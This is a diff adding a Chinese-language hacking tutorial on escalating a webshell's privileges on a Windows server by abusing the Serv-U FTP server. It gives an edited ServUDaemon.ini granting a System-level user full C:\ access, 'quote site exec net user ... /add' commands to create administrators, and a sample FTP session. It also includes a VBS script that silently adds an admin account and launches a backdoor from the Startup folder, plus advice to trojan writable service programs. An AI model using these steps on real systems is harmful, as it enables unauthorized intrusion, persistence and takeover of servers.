@@ -1,0 +1,84 @@
+把webshell的iis user权限提升  
+serv-u服务器提权
+
+C:\Program Files\RhinoSoft.com\Serv-U
+
+serv-u 43958 
+ServUAdmin.exe(记得默认管理员名字和密码)shell直接提权或修改配置文件加用户 
+
+ServUDaemon.ini
+[USER=77169|1]  //用户名
+Password=gn3436a2a7150feb9edf0151aec2bcbde2 //用户密码加密后的密文 gn1234567
+HomeDir=c:TimeOut=600    //超时时间设置
+Maintenance=System  //权限
+Access1=C:\|RWAMELCDP  //默认根目录
+命令格式quote site exec xxxx
+
+1 增加用户
+2 连接 192.168.214.128
+3 执行命令
+quote site exec net user web web /add
+quote site exec net localgroup administrators web /add
+
+[USER=abc|1]
+Password=gn3436a2a7150feb9edf0151aec2bcbde2
+HomeDir=c:TimeOut=600
+Maintenance=System
+Access1=C:\|RWAMELCDP
+
+501 Permission denied.                  //501权限被拒绝。
+200 EXEC command successful (TID=33).  //200 EXEC命令成功（工贸署= 33）。
+
+
+方法2找权限为system的去暴力破解serv-u的密码 e为可执行权限
+
+ 
+一般服务器的管理都是本机设计完毕然后上传到空间里，  
+那么就会用到ftp，服务器使用最多的就是servu   
+那么我们就利用servu来提升权限   
+通过servu提升权限需要servu安装目录可写～   
+好开始把，首先通过webshell访问servu安装文件夹下的ServUDaemon.ini把他下载   
+下来，然后在本机上安装一个servu把ServUDaemon.ini放到本地安装文件夹下覆盖，   
+启动servu添加了一个用户，设置为系统管理员，目录C:\，具有可执行权限   
+然后去servu安装目录里把ServUDaemon.ini更换服务器上的。  
+
+用我新建的用户和密码连接～   
+好的，还是连上了   
+ftp   
+ftp>open ip   
+Connected to ip.   
+220 Serv-U FTP Server v5.0.0.4 for WinSock ready...   
+User (ip:(none)): id //刚才添加的用户   
+331 User name okay, please send complete E-mail address as password.   
+Password:password //密码   
+230 User logged in, proceed.   
+ftp> cd winnt //进入win2k的winnt目录   
+250 Directory changed to /WINNT   
+ftp>cd system32 //进入system32目录   
+250 Directory changed to /WINNT/system32   
+ftp>quote site exec net.exe user rover rover1234 /add //利用系统的net.exe   
+文件加用户。  
+。  
+
+如果提示没有权限，那我们就   
+把后门（server.exe） 传他system32目录   
+然后写一个VBs教本   
+set wshshell=createobject ("wscript.shell")   
+a=wshshell.run ("cmd.exe /c net user user pass /add",0)   
+b=wshshell.run ("cmd.exe /c net localgroup Administrators user /add",0)   
+b=wshshell.run ("cmd.exe /c server.exe",0)  
+
+存为xx.vbe   
+这个教本的作用是建立user用户密码为pass   
+并且提升为管理员   
+然后执行system32目录下的server.exe   
+把这个教本传他 C:\Documents and Settings\All Users\「开始」菜单\程序\启动   
+目录   
+这样管理员只要一登陆就会执行那个教本.   
+接下来就是等了.等他登陆.  
+
+第三   
+就是先检查有什么系统服务，或者随系统启动自动启动的程序和管理员经常使用的软件， 比如诺顿，VAdministrator，金山，瑞星,WinRAR甚至QQ之类的，是否可以写，如果可以就修改其程序， 绑定一个批处理或者VBS，然后还是等待服务器重启。   
+
+
+
